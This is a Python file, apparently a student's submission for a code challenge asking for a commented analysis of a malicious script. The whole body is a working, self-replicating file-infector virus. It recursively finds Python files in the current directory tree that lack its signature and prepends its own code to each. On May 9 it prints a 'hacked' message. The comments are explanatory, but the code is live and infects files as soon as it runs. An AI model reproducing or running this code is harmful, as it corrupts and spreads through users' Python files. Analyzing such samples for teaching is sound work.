#!/usr/bin/env python3
# Script Name:                 code challenge 14
# Author:                       Robert Gillespie
# Date of latest revision:      6/16/2023
# # Purpose:Today you will analyze a malicious script written in Python and submit an interpreted version of the file with comments.

#!/usr/bin/python3

# Importing necessary modules
import os
import datetime

# Define the virus signature
SIGNATURE = "VIRUS"

# Function to locate target files for infection
def locate(path):
    # List to store targeted files
    files_targeted = []

    # Get the list of files in the given path
    filelist = os.listdir(path)

    # Iterate over each file
    for fname in filelist:
        # Check if the file is a directory
        if os.path.isdir(path+"/"+fname):
            # If it's a directory, recursively call the locate function to find files in it
            files_targeted.extend(locate(path+"/"+fname))
        # Check if the file is a Python script
        elif fname[-3:] == ".py":
            # Flag to track if the file is infected
            infected = False
            # Open the file and check each line for the virus signature
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    # If the signature is found, mark the file as infected and break the loop
                    infected = True
                    break
            # If the file is not infected, add it to the targeted files list
            if infected == False:
                files_targeted.append(path+"/"+fname)

    # Return the list of targeted files
    return files_targeted

# Function to infect target files with the virus
def infect(files_targeted):
    # Open the virus script itself
    virus = open(os.path.abspath(__file__))

    # Read the virus code and store it as a string
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close

    # Iterate over each target file
    for fname in files_targeted:
        # Open the target file and read its contents
        f = open(fname)
        temp = f.read()
        f.close()

        # Open the target file in write mode and overwrite it with virus code and original contents
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Function to trigger an action on a specific date
def detonate():
    # Check if the current date is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # Print a message indicating the user has been hacked
        print("You have been hacked")

# Locate target files for infection in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))

# Infect the target files with the virus
infect(files_targeted)

# Trigger the action if the current date is May 9th
detonate()
